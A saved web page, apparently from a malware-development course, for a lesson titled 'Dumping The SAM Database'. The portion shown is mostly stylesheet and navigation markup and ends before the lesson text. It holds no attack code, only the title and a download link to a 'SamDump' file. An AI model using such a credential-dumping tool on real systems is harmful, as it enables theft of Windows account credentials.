f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="75_files/css2.css" rel="stylesheet">
        <link href="75_files/css2_002.css" rel="stylesheet">
        <title>Dumping The SAM Database</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="75_files/app-kkVsMfHl.css"><link rel="stylesheet" href="75_files/app-kkVsMfHl.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="75_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="75_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="7b7f94731c66403db51dedd4a84e6b1c"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="75_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="75_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 75 - Dumping The SAM Database
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="75_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="75_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="75_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="75_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="75_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/SamDump" target="_blank">
                    <img src="75_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
